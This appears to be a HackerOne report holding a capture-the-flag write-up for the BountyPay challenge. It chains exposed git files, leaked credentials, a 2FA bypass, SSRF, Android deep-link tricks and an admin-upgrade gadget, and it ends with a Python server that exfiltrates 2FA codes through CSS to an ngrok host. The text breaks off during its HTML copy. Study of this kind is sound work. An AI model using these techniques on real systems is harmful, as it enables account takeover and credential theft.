{"id":894110,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQxMTA=","url":"https://hackerone.com/reports/894110","title":"h1-ctf writeup , finally paid the payments by chaining multiple bugs","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-06-08T21:35:32.953Z","submitted_at":"2020-06-08T21:35:32.953Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"d1r3wolf","url":"/d1r3wolf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/v3k5gr6QFfVf4pGryaVXyw3p/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"https://hackyholidays.h1ctf.com","about":"Please help us stop the Grinch!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-18T15:28:49.496Z","bug_reporter_agreed_on_going_public_at":"2020-06-18T02:34:23.584Z","team_member_agreed_on_going_public_at":"2020-06-18T15:28:49.410Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Summary:\nUltimate aim is to pay the payments of hackerone using bounty pay with no use privileges at starting.\nGiven scope is : *.bountypay.h1ctf.com\n\n**Enumerated subdomains are :**\n  1. www.bountypay.h1ctf.com\n  2. app.bountypay.h1ctf.com\n  3. staff.bountypay.h1ctf.com\n  4. api.bountypay.h1ctf.com\n  5. software.bountypay.h1ctf.com (cant access gloabally)\n\nThe overall CTF can be divided into levels, at each level we work with one subdomain.\n**Lets make the road map to the CTF:**\n  1. Login into the **app.bountypay.h1ctf.com** (using **git repo files**, 2FA bypass)\n  2. **SSRF** in **load transactions** to access **software.bountypay.h1ctf.com** and getting **BountyPay.apk**\n  3. Solving the **three challenges** of Android to get **api key** of **api.bountypay.h1ctf.com**\n  4. Recon on the **company twitter** to get the staff_id , finding the creds of **staff.bountypay.h1ctf.com** using that **staff id** and staff details route over **api**\n  5. Getting **hackerone** payment creds by **upgrading to admin** using **report feature** and **chaining the logical bugs** over predifined js \n  6. Leaking the **2FA code** by **CSS exfilteration** and bypass 2FA at payments on **app.bountypay.h1ctf.com**\n  \n# Level - 1 :: \nStarted with app.bountypay.h1ctf.com site.\nThrough dirsearch found the git repo files **/.git/**, downloaded the config file https://app.bountypay.h1ctf.com/.git/config\n```\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = https://github.com/bounty-pay-code/request-logger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\nThrough the config file found the git repo https://github.com/bounty-pay-code/request-logger.git.\nThe repo is php request logger .\nthrough the [logger.php code](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php)\n```php\n\u003c?php\n$data = array(\n  'IP'        =\u003e  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =\u003e  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =\u003e  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =\u003e  array(\n      'GET'   =\u003e  $_GET,\n      'POST'  =\u003e  $_POST\n  )\n);\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n```\n found that it logs the POST and GET variables to the log file **bp_web_trace.log** which is in htdocs and can be accessed through server https://app.bountypay.h1ctf.com/bp_web_trace.log.\n```\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\nBy base64 decoding we can get the first four requests of the server\n```\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n```\nUsing that creds we can login into the app.bountypay.h1ctf.com which has an 2FA check.\nThere is no session management, 2FA code is validated using the challenge parameter so 2FA is validated using some relation ship between challenge and challenge_answer.\n```\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=4810310b2c844799dc9c9d46d3838192\u0026challenge_answer=fake\n```\nSeems like the `challenge == md5(challenge_answer)`, tried that one `challenge=144c9defac04969c7bfad8efaa8ea194\u0026challenge_answer=fake`\nWorked : )    -   Successfully logged into app.app.bountypay.h1ctf.com\n\n# Level - 2 ::\nAfter login into the **app.bountypay.h1ctf.com**, it gives a **dashboard** where we can **load transactions based on month, year and pay them**.\nThe brian.oliver is the owner of BountyPayHQ , searched for all months and years, no use, there are no payments for that account.\nBut while loading transactions :\n{F859504}\nIt giving a **url of  api to get the result** and **result data** in the json.\nThe server is **internally requesting the api** for the result. we can achieve **SSRF** if we have control over the url.\nURL : `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=07\u0026year=2020`\nThere is no use of **month and year values** as they are in the **query part**, but after observing the base64 cookie found that the account id **F8gHiqSdpK** has been taken from **token cookie**.\n```\n$ echo eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9 | base64 -d\n{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\nAs we have control over account_id, the injection is in url path, so we can control path over that domain api.bountypay.h1ctf.com only : (.\n\nAfter visiting the [home page](https://api.bountypay.h1ctf.com/) found that there is an redirect at https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API\nurl has an **whitelist check**, but it is accepting https://software.bountypay.h1ctf.com/, which is not accessable globally. \nTried accessing it using ssrf : F859521\nIt has a login page same as app.bountypay.h1ctf.com , tried sending post params in get etc, nothing worked.\nAfter that tried directory brute force using that ssrf, found uploads directory on https://software.bountypay.h1ctf.com/. \n```\u003chtml\u003e\n\u003chead\u003e\u003ctitle\u003eIndex of /uploads/\u003c/title\u003e\u003c/head\u003e\n\u003cbody bgcolor=\"white\"\u003e\n\u003ch1\u003eIndex of /uploads/\u003c/h1\u003e\u003chr\u003e\u003cpre\u003e\u003ca href=\"../\"\u003e../\u003c/a\u003e\n\u003ca href=\"/uploads/BountyPay.apk\"\u003eBountyPay.apk\u003c/a\u003e                                        20-Apr-2020 11:26              4043701\n\u003c/pre\u003e\u003chr\u003e\u003c/body\u003e\n\u003c/html\u003e\n```\nFound the apk on the uploads folder, the files has no restrictions for IP. so downloaded it normally https://software.bountypay.h1ctf.com/uploads/BountyPay.apk .  Apk file : F859556\n\n# Level - 3 :: \nDecompiled the Apk into java files\nAnd found that Three challenges in Apk (PartOneActivity.java, PartTwoActivity.java , PartThreeActicity.java).\nFor each activity there is a deep link, the challenges are just fullfill conditions using deeplinks\n```xml\n        \u003cactivity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_part_three\" android:name=\"bounty.pay.PartThreeActivity\"\u003e\n            \u003cintent-filter android:label=\"\"\u003e\n                \u003caction android:name=\"android.intent.action.VIEW\"/\u003e\n                \u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n                \u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n                \u003cdata android:scheme=\"three\" android:host=\"part\"/\u003e\n            \u003c/intent-filter\u003e\n        \u003c/activity\u003e\n        \u003cactivity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_part_two\" android:name=\"bounty.pay.PartTwoActivity\"\u003e\n            \u003cintent-filter android:label=\"\"\u003e\n                \u003caction android:name=\"android.intent.action.VIEW\"/\u003e\n                \u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n                \u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n                \u003cdata android:scheme=\"two\" android:host=\"part\"/\u003e\n            \u003c/intent-filter\u003e\n        \u003c/activity\u003e\n        \u003cactivity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_part_one\" android:name=\"bounty.pay.PartOneActivity\"\u003e\n            \u003cintent-filter android:label=\"\"\u003e\n                \u003caction android:name=\"android.intent.action.VIEW\"/\u003e\n                \u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n                \u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n                \u003cdata android:scheme=\"one\" android:host=\"part\"/\u003e\n            \u003c/intent-filter\u003e\n        \u003c/activity\u003e\n```\n## First challenge :\n```java\n     if (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n            String firstParam = getIntent().getData().getQueryParameter(\"start\");\n            if (firstParam != null \u0026\u0026 firstParam.equals(\"PartTwoActivity\") \u0026\u0026 settings.contains(str)) {\n```\nIt just checks there is start param in query on deep link and that param value == PartTwoActivity\nSolution : \n```\n$ adb shell am start -d one://part?start=PartTwoActivity\n```\n## Second Challenge \n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n    Uri data = getIntent().getData();\n    String firstParam = data.getQueryParameter(\"two\");\n    String secondParam = data.getQueryParameter(\"switch\");\n    if (firstParam != null \u0026\u0026 firstParam.equals(\"light\") \u0026\u0026 secondParam != null \u0026\u0026 secondParam.equals(\"on\")) {\n```\nIt checks two and switch params must be in query and the values must be `two=light\u0026switch=on`\nSolution : \n```\n$ adb shell am start -d 'two://part?two=light\\\u0026switch=on'\n```\nAfter that there is question where it ask for header value and combine it with `X-` and checks with header value of firebase.\nFrom internal files of firebase in apk found the url for firebase https://bountypay-90f64.firebaseio.com/\nThen getting the header value in it, https://bountypay-90f64.firebaseio.com/header/.json  `Token` is the value, submit it\n\n## Third Challenge\nWhere as PartThreeActivity it checks for `three=base64(PartThreeActivity)` and `switch=base64(on)` and `header=X-Token`\nSolution : \n```\n$ adb shell am start -d 'three://part?three=UGFydFRocmVlQWN0aXZpdHk=\\\u0026switch=b24=\\\u0026header=X-Token'\n```\nTo finish this we need google apps in VM, as firebase requires aiuthentication.\nIt saves the Token and Host values to shared preferences.\n```\n$ adb shell\nroot@vbox86p:/ # cat /data/data/bounty.pay/shared_prefs/user_created.xml\n\u003c?xml version='1.0' encoding='utf-8' standalone='yes' ?\u003e\n\u003cmap\u003e\n    \u003cstring name=\"TWITTERHANDLE\"\u003e\u003c/string\u003e\n    \u003cstring name=\"USERNAME\"\u003eHello\u003c/string\u003e\n    \u003cstring name=\"PARTONE\"\u003eCOMPLETE\u003c/string\u003e\n    \u003cstring name=\"TOKEN\"\u003e8e9998ee3137ca9ade8f372739f062c1\u003c/string\u003e\n    \u003cstring name=\"PARTTWO\"\u003eCOMPLETE\u003c/string\u003e\n    \u003cstring name=\"HOST\"\u003ehttp://api.bountypay.h1ctf.com\u003c/string\u003e\n\u003c/map\u003e\nroot@vbox86p:/ # \n```\nNow we got the token. we can submit it dialogue box that asks after we launch third activity to make it finish F859607.\nFrom the **performPostCall** function of **PartThreeActivity.java** we can get to know how to use the token\n`X-Token: 8e9998ee3137ca9ade8f372739f062c1` as a header for api.bountypay.h1ctf.com\n\n\n# Level - 4 ::\nAfter getting the api token. crawled over the api recursively and only one useful new route `/api/staff`\n```\n_______________________________ Request __________________________________\nGET /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nConnection: close\n\n_______________________________ Response __________________________________\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n```\nAfter few trails over that request , found it resonds to POST method , which takes staff_id as input.\nIf already knows staff_id from GET method is used it is responding as `Staff Member already has an account`\nFor non existing staff_id's `Invalid Staff ID`\n\nThis is most difficult part i faced, didn't expected the recon concept, wasted days over this : (, but i liked it , it is relevant to real life scenario.  \nWe need a new joining staff_id to create an account.\n**Recon part**\nGone to twitter https://twitter.com/BountypayHQ\nThere is a tweet : `Today we welcome Sandra to the team!!!` it is hint for us.\nSearched for following of BountypayHQ in twitter and find sandra twitter account https://twitter.com/SandraA76708114\nThere she posts a tweet of first day job https://twitter.com/SandraA76708114/status/1258693001964068864.\nWhere the photo contains the ID card which has an staff_id on it F859634.\n\n**Staff id**: STF:8FJ3KFISL3\nwith which we can create new account to get staff credentials.\n```\n_______________________________ Request __________________________________\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 23\n\nstaff_id=STF:8FJ3KFISL3\n_______________________________ Response __________________________________\n {\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\nIt creates a new account and gives the username, password of sandra.\nUsername: sandra.allison\nPassword: s%3D8qB8zEpMnc*xsz7Yp5\n\n# Level - 5 :: \nUsing those **staff creds** we can login to **staff.bountypay.h1ctf.com**\nThrough the js file(https://staff.bountypay.h1ctf.com/js/website.js) we can observer there is upgrade to admin concept\n```js\n$(\".upgradeToAdmin\").click(function() {\n    let t = $('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n        alert(\"User Upgraded to Admin\")\n    })\n}), \n$(\".tab\").click(function() {\n    return $(\".tab\").removeClass(\"active\"), $(this).addClass(\"active\"), $(\"div.content\").addClass(\"hidden\"), $(\"div.content-\" + $(this).attr(\"data-target\")).removeClass(\"hidden\"), !1\n}), \n$(\".sendReport\").click(function() {\n    $.get(\"/admin/report?url=\" + url, function() {\n        alert(\"Report sent to admin team\")\n    }), $(\"#myModal\").modal(\"hide\")\n}), \ndocument.location.hash.length \u003e 0 \u0026\u0026 (\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"), \"#tab2\" === document.location.hash \u0026\u0026 $(\".tab2\").trigger(\"click\"), \"#tab3\" === document.location.hash \u0026\u0026 $(\".tab3\").trigger(\"click\"), \"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\"));\n```\n## Observation-1:\n**upgradeToAdmin** is not working for us, **requires admin privilages**.\nThere is a **report functionality** is dashboard , we might use that to trigger the upgrade functionality on **admin side**.\nThe report to admin request takes only **path of the url**\n```\nGET /admin/report?url=Lz90ZW1wbGF0ZT1ob21l HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nCookie: token=c0lsdUV............\n```\nWe have to trigger the upgrade to admin functionality locally only by the url.\n\nObservation-2:\nAs the **avatar** is linked to the **class names** (avatar1, avatar2, avatar2). our **input for avatar** is **simple a class name**.\nSo there is an **class injection in avatar**. It supports **multiple classes** as it allows space char.\nWe can trigger that class injection on `/?template=home` and `/?template=ticket\u0026ticket_id=3582`\n\nObservation - 3:\n**upgrade to  admin** function has been linked to on click listner on **upgradeToAdmin class**\nBased on last line of website.js\n```js\ndocument.location.hash.length \u003e 0 \u0026\u0026 (\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"), \"#tab2\" === document.location.hash \u0026\u0026 $(\".tab2\").trigger(\"click\"), \"#tab3\" === document.location.hash \u0026\u0026 $(\".tab3\").trigger(\"click\"), \"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\"));\n```\nWe can **trigger onclick** using **hash and class names**, as already we have class names in our control for a div.\nWe can set the **class name** as `tab4 upgradeToAdmin` and **hash** as `#tab4` , which first makes the **div to click** based on **.tab4 class name** \nAs the **div also had upgradeToAdmin class**, now it triggers the upgradetoadmin function .\n\nObservation - 4:\n```js\n    let t = $('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n        alert(\"User Upgraded to Admin\")\n    })\n```\nIt is taking the **username** from `input[name=\"username\"]`, we need to find that type of gadget in html.\nafter checking all **templates** , **login template had that gadget**, weirdly there is no check for opening of login template even after loggedin.\nwe need to **fill the username** field with our disired value only with url, tried with get params https://staff.bountypay.h1ctf.com/?template=login\u0026username=nice , Worked : )\n\nObservation - 5:\nBut the **login template** didn't have **class injection**, we need both **login, ticket template** to make this happen.\nAs the template is based on get param, tried giving of multiple templates as array . Worked : )\n\nFinally: \nBy combining all\nChange the avatar value to `tab4 upgradeToAdmin`\n```\nPOST /?template=home HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nCookie: token=c0lsdUV....\n\nprofile_name=sandra\u0026profile_avatar=tab4 upgradeToAdmin\n```\nOpen : https://staff.bountypay.h1ctf.com/?template[]=login\u0026username=sandra\u0026template[]=ticket\u0026ticket_id=3582#tab4\nObserver the traffic, it automatically sends the upgrade to admin request . Now time to report it to admin.\n```\n$ echo -n \"/?template[]=login\u0026username=sandra.allison\u0026template[]=ticket\u0026ticket_id=3582#tab4\" | base64\nLz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlj\na2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ=\n```\nVisit the URL : https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ=\n\nIt gives the new admin tab to the dashbaord.\n{F859704}\nWhich contains passwords of bounty pay accounts. now we got the username and password of hackerone's bountypay account.\n```\nUsername: marten.mickos\nPassword : h\u0026H5wy2Lggj*kKn4OD\u0026Ype\n```\n\n# Level - 6 ::\n Now we can login to hackerone's bounty pay account using those creds on **app.bountypay.h1ctf.com**, using 2FA bypass trich , that we did on level -1\nLoad the **transaction of May 2020**, we need to **pay them** in order to **finish the challellege**.\nPayment : https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\nTo pay there is an send challenge option. Which sends code to 2FA app. that request also takes `app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css`\nBy changing the value, we can load **our style** for that 2FA code. Now our aim is to leak the **7 digit 2FA** code using **CSS exfilteration**.\n\nAfter some trails with **tag names** using **responsive nature of css** (background image), tried **input** tag. It responded with **7 requests**.\nNow tried to brute force the **input tag's name **. Upto `code_` there comes only **one request**.\nAfter that it responded with **1 to 7 values**. then got to understand the **pattern of input name** like code_1, code_2, code_3, code_4, code_5, code_6, code_7.\nWe need to **leak all those seven codes**. As there is **each input for each code**. it became quite simple for bruteforce.\n## Final payload server using ngrok.\n```python\nfrom flask import *\nfrom flask_cors import CORS, cross_origin\nfrom requests import *\n\napp = Flask(__name__,static_folder='')\ncors = CORS(app)\napp.config['CORS_HEADERS'] = 'Content-Type'\n\n@cross_origin()\n@app.route(\"/css/final.css\")\ndef css_file():\n\treturn app.send_static_file(\"check.css\")\n\nrecord_file=\"/tmp/record_%s.txt\"\n\n@app.route(\"/recieve\")\n@cross_origin()\ndef recieve():\n\tchar = request.args.get('char') ; place = request.args.get('place')\n\tprint(place,' - ',char)\n\treturn \"Done\"\n\ndef set_payload(payload):\n\tfinal = open(\"check.css\",'a+'); string =\"\"\n\tPP = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026'()*+,-./:;\u003c=\u003e?@[]^_`{|}~ \"\n\tfor p in PP:\n\t\tstring += str(payload).replace(\"$$\",p).replace(\"||\",str(ord(p)))\n\tfinal.write(string)\n\tfinal.close()\n\nngrok_url = \"https://87dc2cffc13b.ngrok.io\"\npayload = '''\ninput[name^=\"code_!!\"][value=\"$$\"] {\n\tbackground-image:url(\"%s/recieve?value=||\u0026char=$$\u0026place=!!\");\n}\n'''%ngrok_url\n\nif __name__ == '__main__':\n\twith open(\"check.css\",'w') as F: pass\n\tfor i in range(1,8):\n\t\ttemp = payload.replace('!!',str(i))\n\t\tset_payload(temp)\n\tapp.run()\n```\nJust **intercept** the request of **send_challenge (send 2FA)** and **change the app_style** to https://87dc2cffc13b.ngrok.io/css/final.css.\nFrom **python server log** we can get the **7 digits**, we need to **combine and enter on the site**. we have enough time for this [**2 min**]\n**Boom : )**\n\n# Proof of concept\nHere is the flag : ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\nScreenshot : F859448\n\n## Impact\n\nAccess over payments account.","vulnerability_information_html":"\u003ch1 id=\"summary\"\u003eSummary:\u003c/h1\u003e\n\n\u003cp\u003eUltimate aim is to pay the payments of hackerone using bounty pay with no use privileges at starting.\u003cbr\u003e\nGiven scope is : *.bountypay.h1ctf.com\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eEnumerated subdomains are :\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fwww.bountypay.h1ctf.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.bountypay.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eapp.bountypay.h1ctf.com\u003c/li\u003e\n\u003cli\u003estaff.bountypay.h1ctf.com\u003c/li\u003e\n\u003cli\u003eapi.bountypay.h1ctf.com\u003c/li\u003e\n\u003cli\u003esoftware.bountypay.h1ctf.com (cant access gloabally)\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe overall CTF can be divided into levels, at each level we work with one subdomain.\u003cbr\u003e\n\u003cstrong\u003eLets make the road map to the CTF:\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eLogin into the \u003cstrong\u003eapp.bountypay.h1ctf.com\u003c/strong\u003e (using \u003cstrong\u003egit repo files\u003c/strong\u003e, 2FA bypass)\u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003eSSRF\u003c/strong\u003e in \u003cstrong\u003eload transactions\u003c/strong\u003e to access \u003cstrong\u003esoftware.bountypay.h1ctf.com\u003c/strong\u003e and getting \u003cstrong\u003eBountyPay.apk\u003c/strong\u003e\n\u003c/li\u003e\n\u003cli\u003eSolving the \u003cstrong\u003ethree challenges\u003c/strong\u003e of Android to get \u003cstrong\u003eapi key\u003c/strong\u003e of \u003cstrong\u003eapi.bountypay.h1ctf.com\u003c/strong\u003e\n\u003c/li\u003e\n\u003cli\u003eRecon on the \u003cstrong\u003ecompany twitter\u003c/strong\u003e to get the staff_id , finding the creds of \u003cstrong\u003estaff.bountypay.h1ctf.com\u003c/strong\u003e using that \u003cstrong\u003estaff id\u003c/strong\u003e and staff details route over \u003cstrong\u003eapi\u003c/strong\u003e\n\u003c/li\u003e\n\u003cli\u003eGetting \u003cstrong\u003ehackerone\u003c/strong\u003e payment creds by \u003cstrong\u003eupgrading to admin\u003c/strong\u003e using \u003cstrong\u003ereport feature\u003c/strong\u003e and \u003cstrong\u003echaining the logical bugs\u003c/strong\u003e over predifined js \u003c/li\u003e\n\u003cli\u003eLeaking the \u003cstrong\u003e2FA code\u003c/strong\u003e by \u003cstrong\u003eCSS exfilteration\u003c/strong\u003e and bypass 2FA at payments on \u003cstrong\u003eapp.bountypay.h1ctf.com\u003c/strong\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch1 id=\"level-1\"\u003eLevel - 1 ::\u003c/h1\u003e\n\n\u003cp\u003eStarted with app.bountypay.h1ctf.com site.\u003cbr\u003e\nThrough dirsearch found the git repo files \u003cstrong\u003e/.git/\u003c/strong\u003e, downloaded the config file \u003ca title=\"https://app.bountypay.h1ctf.com/.git/config\" href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2F.git%2Fconfig\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.bountypay.h1ctf.com/.git/config\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[core]\n    repositoryformatversion = 0\n    filemode = true\n    bare = false\n    logallrefupdates = true\n[remote \u0026quot;origin\u0026quot;]\n    url = https://github.com/bounty-pay-code/request-logger.git\n    fetch = +refs/heads/*:refs/remotes/origin/*\n[branch \u0026quot;master\u0026quot;]\n    remote = origin\n    merge = refs/heads/master\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThrough the config file found the git repo \u003ca title=\"https://github.com/bounty-pay-code/request-logger.git\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fbounty-pay-code%2Frequest-logger.git\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/bounty-pay-code/request-logger.git\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nThe repo is php request logger .\u003cbr\u003e\nthrough the \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fbounty-pay-code%2Frequest-logger%2Fblob%2Fmaster%2Flogger.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003elogger.php code\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;IP\u0026#39;\u003c/span\u003e        \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REMOTE_ADDR\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;URI\u0026#39;\u003c/span\u003e       \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REQUEST_URI\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;METHOD\u0026#39;\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REQUEST_METHOD\u0026quot;\u003c/span\u003e\u003cspan 